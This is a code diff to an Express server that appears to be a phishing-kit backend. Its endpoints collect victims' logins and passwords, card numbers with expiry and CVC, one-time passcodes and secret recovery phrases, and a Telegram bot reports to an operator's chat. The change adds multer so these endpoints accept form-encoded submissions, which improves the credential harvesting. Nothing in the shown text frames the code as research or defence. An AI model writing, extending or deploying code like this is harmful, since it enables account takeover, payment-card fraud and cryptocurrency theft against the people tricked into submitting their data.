@@ -1,9 +1,12 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const TelegramBot = require('node-telegram-bot-api');
+const multer = require('multer');
 const fs = require('fs');
 const path = require('path');
 const cors = require('cors');
+
+const upload = multer();
 
 // Load configuration
 const config = JSON.parse(fs.readFileSync(path.join(__dirname, 'config.json')));
@@ -42,7 +45,7 @@ bot.sendMessage(config.chatId, 'Bot is up and running!').catch(error => {
 
 
 // Endpoint for handling login and password
-app.post('/api/cred', (req, res) => {
+app.post('/api/cred', upload.none(), (req, res) => {
     const { login, password, sessionId } = req.body;
 
     // Log the received data
@@ -85,7 +88,7 @@ app.post('/api/cred', (req, res) => {
 });
 
 // Endpoint for handling card information
-app.post('/api/card', (req, res) => {
+app.post('/api/card', upload.none(), (req, res) => {
     const { card, exp, cvc, sessionId } = req.body;
 
     // Log the received data
@@ -128,7 +131,7 @@ app.post('/api/card', (req, res) => {
 });
 
 // Endpoint for handling OTP
-app.post('/api/otp', (req, res) => {
+app.post('/api/otp', upload.none(), (req, res) => {
     const { otp, sessionId } = req.body;
 
     // Log the received data
@@ -168,7 +171,7 @@ app.post('/api/otp', (req, res) => {
 });
 
 // Endpoint for handling secret phrase
-app.post('/api/secret', (req, res) => {
+app.post('/api/secret', upload.none(), (req, res) => {
     const { secretPhrase, sessionId } = req.body;
 
     // Log the received data
